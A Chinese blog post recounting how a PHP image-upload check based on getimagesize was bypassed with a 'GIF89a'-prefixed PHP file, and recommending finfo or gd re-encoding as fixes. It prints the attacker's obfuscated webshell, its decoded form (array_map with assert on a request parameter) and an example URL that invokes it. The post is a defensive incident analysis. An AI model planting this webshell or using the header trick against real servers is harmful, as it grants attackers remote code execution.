---
title: 一次PHP图片上传验证不严谨引发的血案
date: 2017-07-05 14:25:01
categories:
- PHP
- 笔记
tags:
- upload
- security
---

之前做过一个项目涉及到用户上传图片，当时项目比较小且一个人做就没用框架。上传这部分的验证综合服务器没有安装`exif`、`gd`扩展就简单根据 **`getimagesize`**([文档](http://php.net/manual/zh/function.getimagesize.php)) 函数是否返回false判断，后面出现了问题。

有天一位前同事告知这个项目被朋友hack注入了脚本，就是通过上传操作。

我登入服务器相应目录，根据时间排序发现了可疑文件，后缀名竟然是 `.php`，矮油我去，赶紧download下来并删除(线上先暂时加了后缀名验证)，打开一看:

``` php
GIF89a
<?php
    @$bSzrL= "s\x74r\x5fr\x65\x70lac\x65";
    @$VwissV= @$bSzrL('drApO','','adrApOrdrApOraydrApO_drApOmdrApOap');
    @$ZXNFh= @$bSzrL('DBCFzQ','','asseDBCFzQrDBCFzQt');
    @$VwissV(@$ZXNFh,(array)@$_REQUEST['csqing123']);
```

毕竟学识浅薄，没搞过别人也没别人搞过，不太熟悉其中的套路，傻眼了两秒。
<!-- more -->
先不管文件中的那些不规则字符变量，问题应该是出在文件开头的 `GIF89a`。本地测试直接使用`getimagesize`函数，`var_dump`出来:

```
array(6) {
  [0]=>
  int(3360)
  [1]=>
  int(15370)
  [2]=>
  int(1)
  [3]=>
  string(27) "width="3360" height="15370""
  ["channels"]=>
  int(3)
  ["mime"]=>
  string(9) "image/gif"
}
```

这尼玛`getimagesize`表示也很无奈，然后使用`exif_imagetype`处理打印出来是1，即常量`IMAGETYPE_GIF`的值，看来`exif`扩展也沦陷了。不慌，接着试`finfo_open`，欣慰的是伴随着一串串的 notice 和 warning, 脚本返回了`false`，完美。

原因暂时找到了，接着就是探究文件头的罪魁祸首 `GIF89a`。查到百科:
[Magic number](https://en.wikipedia.org/wiki/Magic_number_(programming))
> Compiled Java class files (bytecode) and Mach-O binaries start with hex CAFEBABE. When compressed with Pack200 the bytes are changed to CAFED00D.
> 
> GIF image files have the ASCII code for "GIF89a" (47 49 46 38 39 61) or "GIF87a" (47 49 46 38 37 61)
> 
> JPEG image files begin with FF D8 and end with FF D9. JPEG/JFIF files contain the ASCII code for "JFIF" (4A 46 49 46) as a null terminated string. JPEG/Exif files contain the ASCII code for "Exif" (45 78 69 66) also as a null terminated string, followed by more metadata about the file.
> 
> PNG image files begin with an 8-byte signature which identifies the file as a PNG file and allows detection of common file transfer problems: \211 P N G \r \n \032 \n (89 50 4E 47 0D 0A 1A 0A). That signature contains various newline characters to permit detecting unwarranted automated newline conversions, such as transferring the file using FTP with the ASCII transfer mode instead of the binary mode.[5]

大致意思是某些特定的文件含有特定的某些字符，而GIF文件的特殊字符是`GIF89a`,`GIF87a`。由此可推算`getimagesize`和`exif_imagetype`可能就是被文件头部的特殊字符误导判断为GIF文件。*(我试了下把文件头的6个字符删得只剩GIF3个字符后依然存在问题 todo)*

如果要继续探究这两个有问题的函数的话，得去读源码，大致可以猜到有匹配文件头的N个字符去判断有关。

没完，继续。

`GIF89a`后面那些几乎没有可读性的PHP代码究竟是什么？

简单把变量打印出来便知：

``` php
<?php
    @$bSzrL= "s\x74r\x5fr\x65\x70lac\x65";
    @$VwissV= @$bSzrL('drApO','','adrApOrdrApOraydrApO_drApOmdrApOap');
    @$ZXNFh= @$bSzrL('DBCFzQ','','asseDBCFzQrDBCFzQt');
    @$VwissV(@$ZXNFh,(array)@$_REQUEST['csqing123']);

    var_dump($bSzrL, $VwissV, $ZXNFh);

    // 打印结果
    // string(11) "str_replace"
    // string(9) "array_map"
    // string(6) "assert"
```

原来`\x74`,`\x5f`这些鬼字符串是**十六进制**，双引号下自动解析为相应的字符，查进制表就看到 `\x74` -> `t`, `\x5f` -> `_`, 其他同理。

最后经过处理，主要逻辑就一句话：

``` php
<?php
    array_map(`assert`, (array)$_REQUEST['csqing123']);
```

即黑客可**通过开头上传的脚本文件通过`assert`函数执行任何PHP语句**，如：http://www.myproject.com/uploads/hacker.php?csqing123=exit('u r hacked')。

可怕吧。

说回正事，上传的图片究竟该如何验证？GIF有此问题，保不准其他类型的图片文件也存在。首先先排除掉 `getimagesize`,`exif_imagetype` 这两个函数，蛋疼的是我在 stackoverflow 上看到相关问题顶在最上面的回答很多都是用这俩。当然前面测试通过的`finfo`扩展可以，也看到有鬼佬建议用户所有上传的图片都通过`gd`库验证并转化为统一的比如`png`格式的图片，虽然比较耗CPU资源，但一方面文件类型统一方便处理，另一方面绝对保证了图片文件类型的安全性，也不失为一个方向吧。

#### 总结
不可单纯依赖`getimagesize`,`exif_imagetype`这两个函数判断文件是否为图片(至少GIF图片)


<br/><br/><br/>

参考资料：
> [Magic_number, 魔术数字](https://en.wikipedia.org/wiki/Magic_number_(programming))
> 
> [ASCII，十进制，十六进制，八进制和二进制转换表](https://www.ibm.com/support/knowledgecenter/zh/ssw_aix_61/com.ibm.aix.networkcomm/conversion_table.htm)
> 
> [PHP Uploading files - image only checking](https://stackoverflow.com/questions/9314164/php-uploading-files-image-only-checking)
> 
> [How can I only allow certain filetypes on upload in php?](https://stackoverflow.com/questions/2486329/how-can-i-only-allow-certain-filetypes-on-upload-in-php)
